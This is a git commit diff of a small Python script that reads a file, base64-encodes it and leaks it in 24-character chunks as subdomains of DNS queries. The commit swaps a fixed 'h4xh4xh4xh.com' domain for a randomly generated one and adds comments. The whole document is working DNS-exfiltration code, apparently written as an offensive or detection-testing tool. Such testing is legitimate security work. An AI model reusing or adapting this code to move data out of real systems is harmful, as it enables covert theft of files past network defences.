73f3437a0116b4b79e9d6f6ed84917967dd053b5
Kevin West <kwest1@gmail.com>
2020-07-09 00:48:56 -0700

    v1.1

--- encode.py
+++ encode.py
@@ -3,26 +3,30 @@
 import base64 
 import socket
 import dns.resolver
+import random
+import string
+
+def randStr(chars = string.ascii_lowercase, N=10):
+	return ''.join(random.choice(chars) for _ in range(N))
 
 dns.resolver.Timeout = 1
 dns.resolver.lifetime = 1
 
-DOMAIN = ".h4xh4xh4xh.com"
+DOMAIN = "." + randStr(N=10) + ".com"
 
 data = open('data.txt', 'rb') #open binary file in read mode
 data_read = data.read()
 encodedBytes = base64.b64encode(data_read)
-encodedStr = str(encodedBytes, "utf-8")
+encodedStr = str(encodedBytes, "utf-8") #converts Base64 to string from bytes
 
-parse = [encodedStr[i:i+32] for i in range(0, len(encodedStr), 32)] #breaks the base64 text file into 16 character chunks and passes to parse
+parse = [encodedStr[i:i+24] for i in range(0, len(encodedStr), 24)] #breaks the base64 text file into 24 character chunks and passes to parse
 
 ctr = 0
 for chunk in parse:
-    ret = (parse[ctr]+DOMAIN)
     try:
-        print(dns.resolver.query(parse[ctr]+DOMAIN))
+        print(dns.resolver.query(parse[ctr]+DOMAIN)) #query DNS Domain
     except (dns.resolver.NoAnswer):
-        print("Couldn't find any records (NoAnswer)")
+        print("Couldn't find any records (NoAnswer)") #Error handling on Timeout
     except (dns.resolver.NXDOMAIN):
-        print("Couldn't find any records (NXDOMAIN): " + parse[ctr]+DOMAIN)
+        print("Couldn't find any records (NXDOMAIN): " + parse[ctr]+DOMAIN) #Error handling if DNS is cached on host and cant find.
     ctr = ctr + 1
